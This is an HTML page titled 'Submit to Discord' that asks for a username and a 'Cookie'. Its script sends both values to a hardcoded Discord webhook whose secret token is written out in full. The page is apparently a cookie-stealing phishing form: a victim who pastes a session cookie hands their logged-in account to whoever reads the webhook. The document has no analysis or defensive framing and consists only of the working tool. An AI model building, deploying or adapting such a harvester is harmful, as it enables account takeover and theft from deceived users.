<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit to Discord</title>
</head>
<body>
    <div style="max-width: 400px; margin: 0 auto;">
        <form id="webhookForm">
            <label for="usernameBox">Username:</label>
            <input type="text" id="usernameBox" name="usernameBox" required style="width: 100%; margin-bottom: 10px;">
            
            <label for="textBox">Cookie:</label>
            <input type="text" id="textBox" name="textBox" required style="width: 100%; margin-bottom: 10px;">
            
            <button type="submit" style="width: 100%;">Submit</button>
        </form>
    </div>

    <script>
        document.getElementById('webhookForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const webhookUrl = 'https://discord.com/api/webhooks/1251342908150517830/UfLJSFjaZvRlUmnmo783glV2L2hUyca4HgD1nKpYxxNhsA2_i8TFg4j7cQtq2Pt0i_pH';
            const username = document.getElementById('usernameBox').value;
            const message = document.getElementById('textBox').value;

            const discordMessage = `**Username:** ${username}\n**Cookie:** ${message}`;

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: discordMessage
                })
            }).then(response => {
                if(response.ok) {
                    alert('Message sent successfully!');
                } else {
                    alert('Error sending message.');
                }
            }).catch(error => {
                console.error('Error:', error);
                alert('Error sending message.');
            });
        });
    </script>
</body>
</html>
